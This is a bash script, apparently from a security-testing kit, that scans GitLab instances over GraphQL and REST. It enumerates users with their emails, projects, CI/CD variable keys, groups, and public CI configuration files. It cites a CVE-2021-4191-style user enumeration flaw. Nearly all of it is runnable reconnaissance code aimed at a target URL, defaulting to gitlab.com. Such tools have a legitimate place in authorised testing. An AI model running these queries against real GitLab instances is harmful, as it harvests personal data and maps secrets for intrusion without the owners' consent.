#!/bin/bash
# GitLab GraphQL Enumeration & IDOR Scanner
# Tests for data leaking across permission boundaries
#
# USAGE:
#   chmod +x 03-graphql-enum.sh
#   ./03-graphql-enum.sh <gitlab-url> <token>

GITLAB_URL="${1:-https://gitlab.com}"
TOKEN="$2"
AUTH_HEADER="PRIVATE-TOKEN: $TOKEN"

if [ -z "$TOKEN" ]; then
    echo "[!] Warning: No token provided. Running unauthenticated (limited results)."
    AUTH_HEADER="Content-Type: application/json"
fi

echo "[*] Target: $GITLAB_URL"
echo "[*] Auth: $([ -n "$TOKEN" ] && echo "YES" || echo "NO")"
echo ""

# Test 1: User enumeration (CVE-2021-4191 style)
echo "--- Test 1: User Enumeration ---"
curl -s "$GITLAB_URL/api/graphql?query=query{users{edges{node{id%20username%20name%20email}}}}" \
  -H "$AUTH_HEADER" | jq '.data.users.edges[] | {id: .node.id, username: .node.username, name: .node.name, email: .node.email}' 2>/dev/null || echo "Failed or no results"

# Test 2: Project discovery via namespace
echo ""
echo "--- Test 2: Project Discovery ---"
curl -s "$GITLAB_URL/api/graphql?query=query{projects(membership:true,first:10){edges{node{id%20fullPath%20visibility%20archived}}}}" \
  -H "$AUTH_HEADER" | jq '.data.projects.edges[].node | {path: .fullPath, visibility: .visibility, archived: .archived}' 2>/dev/null || echo "Failed or no results"

# Test 3: CI/CD variable enumeration on accessible projects
echo ""
echo "--- Test 3: CI Variable Discovery ---"
echo "[*] Enumerate projects with CI vars..."
curl -s "$GITLAB_URL/api/graphql?query=query{projects(membership:true,first:5){edges{node{fullPath%20ciVariables{edges{node{key%20protected%20masked}}}}}}}" \
  -H "$AUTH_HEADER" | jq '.data.projects.edges[].node | {project: .fullPath, variables: .ciVariables.edges[].node}' 2>/dev/null || echo "Failed or no results"

# Test 4: Group enumeration
echo ""
echo "--- Test 4: Group Enumeration ---"
curl -s "$GITLAB_URL/api/v4/groups" \
  -H "$AUTH_HEADER" | jq '.[] | {id, name, path, visibility, member_count}' 2>/dev/null || echo "Failed or no results"

# Test 5: Check for exposed .gitlab-ci.yml in public projects
echo ""
echo "--- Test 5: Public CI Config Scan ---"
for ns in $(curl -s "$GITLAB_URL/api/v4/projects?per_page=5&order_by=last_activity_at" \
  -H "$AUTH_HEADER" | jq -r '.[].path_with_namespace' 2>/dev/null); do
  echo "[*] Checking $ns..."
  curl -s "$GITLAB_URL/$ns/-/raw/main/.gitlab-ci.yml" -I | head -3
done

echo ""
echo "[*] Done. Review any unexpected data exposure above."
